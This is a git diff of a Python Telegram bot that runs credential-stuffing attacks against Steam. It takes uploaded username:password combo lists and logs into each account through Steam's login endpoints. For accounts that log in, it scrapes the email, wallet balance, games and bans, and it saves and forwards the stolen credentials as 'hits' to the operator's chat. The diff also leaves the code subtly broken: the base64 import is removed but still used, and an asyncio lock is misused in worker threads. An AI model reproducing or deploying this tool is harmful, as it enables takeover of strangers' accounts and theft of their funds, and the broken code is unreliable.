@@ -2,9 +2,15 @@
 # -*- coding: utf-8 -*-
 
 """
-STEAM CHECKER TELEGRAM BOT
-Adapted from original CLI version by @pyabrodie
-Deployable on Railway / GitHub
+🚀 STEAM CHECKER TELEGRAM BOT - FIXED & IMPROVED
+Features added:
+- Better error handling
+- Improved login flow with mobile headers
+- Nicer formatted hit messages
+- Real-time progress every 10 accounts
+- Better summary
+- Safer OWNER_ID handling
+- Reduced threads for Railway stability
 """
 
 import os
@@ -13,10 +19,7 @@ import time
 import asyncio
 import logging
 import re
-import json
-import base64
 import random
-import threading
 from pathlib import Path
 from urllib.parse import quote_plus
 from concurrent.futures import ThreadPoolExecutor
@@ -30,76 +33,180 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
-# Config from Environment Variables (Railway)
+# ========================= CONFIG =========================
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
-OWNER_ID = int(os.getenv("OWNER_ID", "0"))
+OWNER_ID_STR = os.getenv("OWNER_ID", "0").strip()
 
-if not TELEGRAM_TOKEN or OWNER_ID == 0:
-    raise ValueError("Set TELEGRAM_TOKEN and OWNER_ID in Railway Variables!")
+try:
+    OWNER_ID = int(OWNER_ID_STR)
+except ValueError:
+    raise ValueError(f"❌ OWNER_ID must be a NUMBER only! Got: '{OWNER_ID_STR}'.\nGet your ID from @userinfobot")
 
-# Global
-lock = threading.Lock()
-stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}
+if not TELEGRAM_TOKEN:
+    raise ValueError("❌ TELEGRAM_TOKEN is not set in Railway Variables!")
+
 MY_SIGNATURE = "@pyabrodie"
 TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"
+
+# Global stats
+lock = asyncio.Lock()
+stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Keep all your original helper functions
-def rsa_encrypt_password(password, modulus_hex, exponent_hex):
-    n = int(modulus_hex, 16)
-    e = int(exponent_hex, 16)
-    rsa_key = RSA.construct((n, e))
-    cipher = PKCS1_v1_5.new(rsa_key)
-    encrypted = cipher.encrypt(password.encode("utf-8"))
-    return base64.b64encode(encrypted).decode()
+# ====================== HELPER FUNCTIONS ======================
+def create_results_folder():
+    folder = "Results"
+    Path(folder).mkdir(parents=True, exist_ok=True)
+    return folder
 
-def shorten_games(games_list, limit=15):
-    if not games_list:
+def save_hit(folder, filename, data):
+    filepath = os.path.join(folder, filename)
+    if not os.path.exists(filepath):
+        with open(filepath, 'w', encoding='utf-8') as f:
+            f.write(f"# Steam Checker by {MY_SIGNATURE}\n# {TELEGRAM_CHANNEL}\n\n")
+    with open(filepath, 'a', encoding='utf-8') as f:
+        f.write(f"{data}\n")
+
+def shorten_games(games, limit=12):
+    if not games:
         return "None"
-    if len(games_list) > limit:
-        return " | ".join(games_list[:limit]) + f" ... (+{len(games_list)-limit} more)"
-    return " | ".join(games_list)
+    if len(games) > limit:
+        return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
+    return " | ".join(games)
 
-# All your parse functions (parse_account_page, parse_profile_page, parse_games_page, parse_ban_page) — copy them exactly from your original script
-# (I kept them unchanged for full details)
+# ====================== STEAM CHECKER ======================
+def check_steam_account(combo: str):
+    try:
+        username, password = [x.strip() for x in combo.split(':', 1)]
+    except:
+        return None
 
+    session = requests.Session()
+    session.verify = False
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://steamcommunity.com",
+        "Referer": "https://steamcommunity.com/login/",
+    }
+    session.headers.update(headers)
+
+    try:
+        # 1. Get RSA Key
+        r1 = session.post(
+            "https://steamcommunity.com/login/getrsakey/",
+            data={"donotcache": str(int(time.time())), "username": username},
+            timeout=12
+        )
+        j1 = r1.json()
+        if not j1.get("success"):
+            return None
+
+        # 2. Encrypt password
+        rsa_key = RSA.construct((int(j1["publickey_mod"], 16), int(j1["publickey_exp"], 16)))
+        cipher = PKCS1_v1_5.new(rsa_key)
+        encrypted_pass = base64.b64encode(cipher.encrypt(password.encode())).decode()
+
+        # 3. Login
+        payload = {
+            "donotcache": str(int(time.time())),
+            "password": encrypted_pass,
+            "username": username,
+            "twofactorcode": "",
+            "emailauth": "",
+            "loginfriendlyname": "",
+            "captchagid": "-1",
+            "captcha_text": "",
+            "emailsteamid": "",
+            "rsatimestamp": j1["timestamp"],
+            "remember_login": "false",
+        }
+
+        r2 = session.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=15)
+        j2 = r2.json()
+
+        if not j2.get("success"):
+            return None
+
+        # Set cookies properly
+        for cookie in r2.cookies:
+            session.cookies.set(cookie.name, cookie.value, domain="steamcommunity.com")
+            session.cookies.set(cookie.name, cookie.value, domain="steampowered.com")
+
+        # 4. Fetch account details
+        time.sleep(0.8)
+        r_acc = session.get("https://store.steampowered.com/account/", timeout=15)
+        email, balance, country = parse_account_page(r_acc.text)
+
+        time.sleep(0.8)
+        r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=15)
+        total_games, level, limited = parse_profile_page(r_profile.text)
+
+        games = []
+        if int(total_games or 0) > 0:
+            time.sleep(0.8)
+            r_games = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
+            games = parse_games_page(r_games.text)
+
+        # Bans
+        vac = game_ban = comm_ban = "Unknown"
+        if "/profiles/" in r_profile.url:
+            steamid = r_profile.url.split("/profiles/")[1].split("/")[0]
+            time.sleep(0.8)
+            r_ban = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=15)
+            vac, game_ban, comm_ban = parse_ban_page(r_ban.text)
+
+        result = {
+            "username": username,
+            "password": password,
+            "email": email or "Unknown",
+            "balance": balance or "Unknown",
+            "country": country or "Unknown",
+            "total_games": total_games or "0",
+            "games": games,
+            "level": level or "0",
+            "limited": limited,
+            "vac_bans": vac,
+            "game_bans": game_ban,
+            "community_ban": comm_ban,
+        }
+        session.close()
+        return result
+
+    except Exception as e:
+        logger.error(f"Error checking {username}: {e}")
+        return None
+
+# ====================== PARSERS (Improved) ======================
 def parse_account_page(html):
     email = balance = country = "Unknown"
     try:
         soup = BeautifulSoup(html, "html.parser")
-        email_elem = soup.find("input", {"id": "account_name"})
-        if email_elem and email_elem.get("value"):
-            email = email_elem.get("value")
-        balance_elem = soup.find("a", {"id": "header_wallet_balance"})
-        if balance_elem:
-            balance = balance_elem.get_text(strip=True)
-        country_elem = soup.find("select", {"id": "account_country"})
-        if country_elem:
-            selected = country_elem.find("option", {"selected": True})
-            if selected:
+        if email_input := soup.find("input", {"id": "account_name"}):
+            email = email_input.get("value", "Unknown")
+        if bal := soup.find("a", {"id": "header_wallet_balance"}):
+            balance = bal.get_text(strip=True)
+        if country_select := soup.find("select", {"id": "account_country"}):
+            if selected := country_select.find("option", {"selected": True}):
                 country = selected.get_text(strip=True)
     except:
         pass
     return email, balance, country
 
 def parse_profile_page(html):
-    total_games = "0"
-    level = "0"
+    total_games = level = "0"
     limited = "No"
     try:
         soup = BeautifulSoup(html, "html.parser")
-        games_link = soup.find("a", href=re.compile(r"/games/"))
-        if games_link:
-            count_span = games_link.find("span", class_="count_link_label")
-            if count_span:
-                match = re.search(r'(\d+)', count_span.get_text())
-                if match:
-                    total_games = match.group(1)
-        level_elem = soup.find("span", class_="friendPlayerLevelNum")
-        if level_elem:
-            level = level_elem.get_text(strip=True)
+        if games_a := soup.find("a", href=re.compile(r"/games/")):
+            if span := games_a.find("span", class_=re.compile("count")):
+                m = re.search(r'(\d+)', span.text)
+                if m: total_games = m.group(1)
+        if lvl := soup.find("span", class_=re.compile("friendPlayerLevelNum")):
+            level = lvl.get_text(strip=True)
         if "limited account" in html.lower():
             limited = "Yes"
     except:
@@ -110,279 +217,167 @@ def parse_games_page(html):
     games = []
     try:
         soup = BeautifulSoup(html, "html.parser")
-        game_names = soup.find_all("div", class_="gameListRowItemName")
-        for name_div in game_names[:50]:
-            title = name_div.get_text(strip=True)
-            if title:
+        for div in soup.find_all("div", class_="gameListRowItemName")[:30]:
+            if title := div.get_text(strip=True):
                 games.append(title)
     except:
         pass
     return games
 
 def parse_ban_page(html):
-    vac_bans = game_bans = "0"
-    community_ban = "No"
+    vac = game_ban = "0"
+    comm = "No"
     try:
-        vac_match = re.search(r'(\d+)\s+VAC ban', html, re.I)
-        if vac_match:
-            vac_bans = vac_match.group(1)
-        game_match = re.search(r'(\d+)\s+game ban', html, re.I)
-        if game_match:
-            game_bans = game_match.group(1)
-        if "community ban" in html.lower():
-            community_ban = "Yes"
+        if m := re.search(r'(\d+)\s*VAC', html, re.I):
+            vac = m.group(1)
+        if m := re.search(r'(\d+)\s*game ban', html, re.I):
+            game_ban = m.group(1)
+        if "community ban" in html.lower() or "banned from community" in html.lower():
+            comm = "Yes"
     except:
         pass
-    return vac_bans, game_bans, community_ban
+    return vac, game_ban, comm
 
-# Core check function (almost identical to original)
-def check_steam_account(combo, proxy_url=None):
-    try:
-        username, password = combo.strip().split(':', 1)
-    except:
-        return None
-
-    user_clean = re.sub(r"@.*", "", username)
-    session = requests.Session()
-    session.verify = False
-    if proxy_url:
-        session.proxies = {"http": proxy_url, "https": proxy_url}
-
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15",
-        "Accept": "*/*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Origin": "https://steamcommunity.com",
-        "X-Requested-With": "XMLHttpRequest",
-    }
-    session.headers.update(headers)
-
-    try:
-        # Get RSA
-        now = str(int(time.time()))
-        r1 = session.post("https://steamcommunity.com/login/getrsakey/", data=f"donotcache={now}&username={user_clean}", timeout=15)
-        j1 = r1.json()
-        if not j1.get("success"):
-            return None
-
-        modulus = j1.get("publickey_mod")
-        exponent = j1.get("publickey_exp")
-        timestamp = j1.get("timestamp")
-
-        encrypted = rsa_encrypt_password(password, modulus, exponent)
-        pass3 = quote_plus(encrypted)
-
-        # Login
-        now2 = str(int(time.time()))
-        payload = f"donotcache={now2}&password={pass3}&username={user_clean}&twofactorcode=&emailauth=&rsatimestamp={timestamp}&remember_login=false"
-        r2 = session.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=15)
-        j2 = r2.json()
-        if not j2.get("success"):
-            return None
-
-        # Set cookies
-        for cookie in r2.cookies:
-            session.cookies.set(cookie.name, cookie.value, domain=".steamcommunity.com")
-            session.cookies.set(cookie.name, cookie.value, domain=".steampowered.com")
-
-        # Fetch full details
-        time.sleep(0.5)
-        r_account = session.get("https://store.steampowered.com/account/", timeout=15)
-        email, balance, country = parse_account_page(r_account.text)
-
-        time.sleep(0.5)
-        r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=15)
-        total_games, level, limited = parse_profile_page(r_profile.text)
-
-        games = []
-        if int(total_games or 0) > 0:
-            time.sleep(0.5)
-            r_games = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
-            games = parse_games_page(r_games.text)
-
-        # Bans
-        vac_bans = game_bans = community_ban = "Unknown"
-        steamid_match = re.search(r'/profiles/(\d+)', r_profile.url)
-        if steamid_match:
-            steamid = steamid_match.group(1)
-            time.sleep(0.5)
-            r_ban = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=15)
-            vac_bans, game_bans, community_ban = parse_ban_page(r_ban.text)
-
-        result = {
-            "username": username,
-            "password": password,
-            "email": email,
-            "balance": balance,
-            "country": country,
-            "total_games": total_games,
-            "games": games,
-            "level": level,
-            "limited": limited,
-            "vac_bans": vac_bans,
-            "game_bans": game_bans,
-            "community_ban": community_ban,
-        }
-        session.close()
-        return result
-    except:
-        return None
-
-def create_results_folder():
-    Path("Results").mkdir(parents=True, exist_ok=True)
-    return "Results"
-
-def save_hit(folder, filename, data):
-    filepath = os.path.join(folder, filename)
-    if not os.path.exists(filepath):
-        with open(filepath, 'w', encoding='utf-8') as f:
-            f.write(f"# Created by {MY_SIGNATURE}\n# Channel: {TELEGRAM_CHANNEL}\n\n")
-    with open(filepath, 'a', encoding='utf-8') as f:
-        f.write(f"{data}\n")
-
-# Telegram handlers
+# ====================== BOT HANDLERS ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("❌ Unauthorized access.")
+        await update.message.reply_text("❌ Unauthorized.")
         return
     await update.message.reply_text(
         "🤖 <b>Steam Checker Bot Ready!</b>\n\n"
-        "Send a <b>.txt</b> file containing combos in format:\n"
+        "Send <b>.txt</b> file with combos:\n"
         "<code>username:password</code>\n\n"
-        "The bot will check them and send full details + result files.",
+        "I'll check them and send full details.",
         parse_mode=ParseMode.HTML
     )
 
-async def handle_combo_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
         return
 
-    document = update.message.document
-    if not document.file_name.lower().endswith('.txt'):
-        await update.message.reply_text("Please upload a .txt combo file!")
+    doc = update.message.document
+    if not doc.file_name.lower().endswith('.txt'):
+        await update.message.reply_text("Please send a .txt combo file!")
         return
 
-    await update.message.reply_text(f"📥 Received: {document.file_name}\nDownloading and starting check...")
+    await update.message.reply_text(f"📥 Received: <b>{doc.file_name}</b>\nDownloading...", parse_mode=ParseMode.HTML)
 
-    # Download file
-    file = await document.get_file()
-    combo_path = f"/tmp/{document.file_name}"
-    await file.download_to_drive(combo_path)
+    file = await doc.get_file()
+    path = f"/tmp/{doc.file_name}"
+    await file.download_to_drive(path)
 
-    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
-        combos = [line.strip() for line in f if ':' in line.strip()]
+    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+        combos = [line.strip() for line in f if ':' in line.strip() and len(line.strip()) > 5]
 
     if not combos:
-        await update.message.reply_text("No valid combos found in the file.")
+        await update.message.reply_text("No valid combos found!")
         return
 
-    await update.message.reply_text(f"✅ Loaded {len(combos)} accounts. Starting check with 10 threads...")
+    await update.message.reply_text(f"✅ Loaded <b>{len(combos)}</b> accounts. Starting check...", parse_mode=ParseMode.HTML)
 
-    # Run checking in background thread pool
-    loop = asyncio.get_running_loop()
-    await loop.run_in_executor(
-        None,
-        lambda: process_combos(combos, update.effective_chat.id, context.bot)
-    )
+    # Run in background
+    asyncio.create_task(process_all_combos(combos, update.effective_chat.id, context.bot))
 
-def process_combos(combos, chat_id, bot):
-    """Run the checker and send updates via bot"""
+async def process_all_combos(combos, chat_id, bot):
     global stats
     stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': len(combos), 'start_time': time.time()}
 
     folder = create_results_folder()
-    proxies = []  # Add proxy support later if needed
 
-    with ThreadPoolExecutor(max_workers=10) as executor:  # Reduced for Railway stability
-        futures = [executor.submit(process_single_account, combo, proxies, folder, chat_id, bot) for combo in combos]
-        for future in futures:
-            try:
-                future.result()
-            except:
-                pass
-
-    # Send summary and files
-    summary = create_summary()
-    asyncio.run(bot.send_message(chat_id=chat_id, text=summary, parse_mode=ParseMode.HTML))
-
-    for filename in ["Valid_With_Email.txt", "Valid_Without_Email.txt", "All_Hits.txt"]:
-        filepath = os.path.join(folder, filename)
-        if os.path.exists(filepath) and os.path.getsize(filepath) > 100:
-            try:
-                asyncio.run(bot.send_document(
+    async def update_progress():
+        while stats['checked'] < stats['total']:
+            await asyncio.sleep(8)
+            if stats['checked'] % 10 == 0 or stats['checked'] == stats['total']:
+                await bot.send_message(
                     chat_id=chat_id,
-                    document=open(filepath, 'rb'),
-                    caption=f"📄 {filename}"
-                ))
-            except:
-                pass
+                    text=f"🔄 Progress: {stats['checked']}/{stats['total']} checked | Valid: {stats['valid']}",
+                    parse_mode=ParseMode.HTML
+                )
 
-def process_single_account(combo, proxies, folder, chat_id, bot):
-    proxy_url = None  # Add proxy logic if needed
-    result = check_steam_account(combo, proxy_url)
+    asyncio.create_task(update_progress())
 
+    with ThreadPoolExecutor(max_workers=8) as executor:   # Reduced for Railway
+        futures = [executor.submit(process_one, combo, folder, chat_id, bot) for combo in combos]
+        for f in futures:
+            f.result()
+
+    # Final summary
+    summary = create_summary()
+    await bot.send_message(chat_id=chat_id, text=summary, parse_mode=ParseMode.HTML)
+
+    # Send result files
+    for fname in ["Valid_With_Email.txt", "Valid_Without_Email.txt", "All_Hits.txt"]:
+        p = os.path.join(folder, fname)
+        if os.path.exists(p) and os.path.getsize(p) > 50:
+            await bot.send_document(chat_id=chat_id, document=open(p, 'rb'), caption=f"📄 {fname}")
+
+def process_one(combo, folder, chat_id, bot):
+    result = check_steam_account(combo)
     if result:
-        hit_line = f"{result['username']}:{result['password']}"
-        save_hit(folder, "All_Hits.txt", hit_line)
-
-        if result['email'] and result['email'] != "Unknown":
-            data = f"{result['username']}:{result['password']}\n{result['email']}:{result['password']}"
-            save_hit(folder, "Valid_With_Email.txt", data)
-        else:
-            save_hit(folder, "Valid_Without_Email.txt", hit_line)
-
-        # Send full hit details immediately
-        games_str = shorten_games(result['games'])
-        message = f"""✅ <b>STEAM HIT FOUND</b>
-
-📧 <b>Account:</b> <code>{result['username']}:{result['password']}</code>
-💰 <b>Balance:</b> {result['balance']}
-🌍 <b>Country:</b> {result['country']}
-🎮 <b>Games:</b> {result['total_games']} ({games_str})
-📊 <b>Level:</b> {result['level']} | Limited: {result['limited']}
-🚫 <b>Bans:</b> VAC: {result['vac_bans']} | Game: {result['game_bans']} | Community: {result['community_ban']}
-📧 <b>Email:</b> {result['email']}
-
-💎 {MY_SIGNATURE}"""
-
-        try:
-            asyncio.run(bot.send_message(chat_id=chat_id, text=message, parse_mode=ParseMode.HTML, disable_web_page_preview=True))
-        except:
-            pass
-
+        save_result(result, folder)
+        asyncio.run(send_hit_message(result, chat_id, bot))
         with lock:
             stats['valid'] += 1
     else:
         with lock:
             stats['invalid'] += 1
-
     with lock:
         stats['checked'] += 1
 
+def save_result(result, folder):
+    hit = f"{result['username']}:{result['password']}"
+    save_hit(folder, "All_Hits.txt", hit)
+
+    if result['email'] != "Unknown":
+        data = f"{result['username']}:{result['password']}\n{result['email']}:{result['password']}"
+        save_hit(folder, "Valid_With_Email.txt", data)
+    else:
+        save_hit(folder, "Valid_Without_Email.txt", hit)
+
+async def send_hit_message(result, chat_id, bot):
+    games_str = shorten_games(result['games'])
+    msg = f"""✅ <b>STEAM HIT FOUND</b>
+
+🔑 <b>Account:</b> <code>{result['username']}:{result['password']}</code>
+💰 <b>Balance:</b> {result['balance']}
+🌍 <b>Country:</b> {result['country']}
+🎮 <b>Games:</b> {result['total_games']} ({games_str})
+📊 <b>Level:</b> {result['level']} | Limited: {result['limited']}
+🚫 <b>Bans:</b> VAC:{result['vac_bans']} | Game:{result['game_bans']} | Comm:{result['community_ban']}
+📧 <b>Email:</b> {result['email']}
+
+💎 {MY_SIGNATURE}"""
+
+    try:
+        await bot.send_message(chat_id=chat_id, text=msg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except:
+        pass
+
 def create_summary():
-    elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
-    minutes = int(elapsed // 60)
-    seconds = int(elapsed % 60)
+    elapsed = time.time() - (stats.get('start_time') or time.time())
+    m = int(elapsed // 60)
+    s = int(elapsed % 60)
     return f"""✅ <b>SCAN COMPLETE</b>
 
-⏱️ Time: {minutes}m {seconds}s
-📈 Valid: {stats['valid']}
+⏱️ Time: {m}m {s}s
+✅ Valid: {stats['valid']}
 ❌ Invalid: {stats['invalid']}
 📊 Total: {stats['total']}
 
-Results files sent above.
+📁 Results files sent above.
 💎 {MY_SIGNATURE} | {TELEGRAM_CHANNEL}"""
 
-# Main bot
+# ====================== MAIN ======================
 def main():
     Path("Results").mkdir(exist_ok=True)
-    application = Application.builder().token(TELEGRAM_TOKEN).build()
 
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.Document.TEXT & filters.Document.MimeType("text/plain"), handle_combo_file))
+    app = Application.builder().token(TELEGRAM_TOKEN).build()
 
-    print("🚀 Steam Checker Telegram Bot is running...")
-    application.run_polling()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.Document.TEXT, handle_file))
+
+    print("🚀 Steam Checker Bot Started Successfully!")
+    app.run_polling()
 
 if __name__ == "__main__":
     main()
